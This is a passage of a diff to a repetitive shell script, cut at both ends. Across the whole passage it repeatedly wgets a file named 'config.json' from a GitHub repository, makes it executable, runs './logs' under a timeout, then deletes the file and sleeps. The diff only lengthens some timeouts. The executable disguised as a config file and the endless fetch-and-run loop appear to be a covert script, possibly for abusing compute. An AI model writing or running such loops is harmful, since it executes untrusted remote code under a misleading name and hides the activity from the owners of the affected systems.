 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1090,7 +1090,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1102,7 +1102,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1114,7 +1114,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1126,7 +1126,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1138,7 +1138,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1150,7 +1150,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1162,7 +1162,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1174,7 +1174,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1186,7 +1186,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1198,7 +1198,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1210,7 +1210,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1222,7 +1222,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1234,7 +1234,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1246,7 +1246,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1258,7 +1258,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1270,7 +1270,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1282,7 +1282,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1294,7 +1294,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1306,7 +1306,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1318,7 +1318,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1330,7 +1330,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1342,7 +1342,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1354,7 +1354,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1366,7 +1366,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1378,7 +1378,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1390,7 +1390,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1402,7 +1402,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1414,7 +1414,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1426,7 +1426,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1438,7 +1438,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1450,7 +1450,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1462,7 +1462,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1474,7 +1474,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1486,7 +1486,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1498,7 +1498,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1510,7 +1510,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1522,7 +1522,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1534,7 +1534,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1546,7 +1546,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1558,7 +1558,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1570,7 +1570,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1582,7 +1582,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1594,7 +1594,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1606,7 +1606,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1618,7 +1618,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1630,7 +1630,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1642,7 +1642,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1654,7 +1654,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1666,7 +1666,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1678,7 +1678,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1690,7 +1690,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1702,7 +1702,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1714,7 +1714,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1726,7 +1726,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1738,7 +1738,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1750,7 +1750,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1762,7 +1762,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1774,7 +1774,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1786,7 +1786,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1798,7 +1798,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1810,7 +1810,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1822,7 +1822,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1834,7 +1834,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1846,7 +1846,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1858,7 +1858,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1870,7 +1870,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1882,7 +1882,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1894,7 +1894,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1906,7 +1906,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1918,7 +1918,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1930,7 +1930,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1942,7 +1942,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1954,7 +1954,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1966,7 +1966,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1978,7 +1978,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -1990,7 +1990,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2002,7 +2002,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2014,7 +2014,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2026,7 +2026,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2038,7 +2038,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2050,7 +2050,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2062,7 +2062,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2074,7 +2074,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2086,7 +2086,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2098,7 +2098,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2110,7 +2110,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2122,7 +2122,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2134,7 +2134,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2146,7 +2146,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
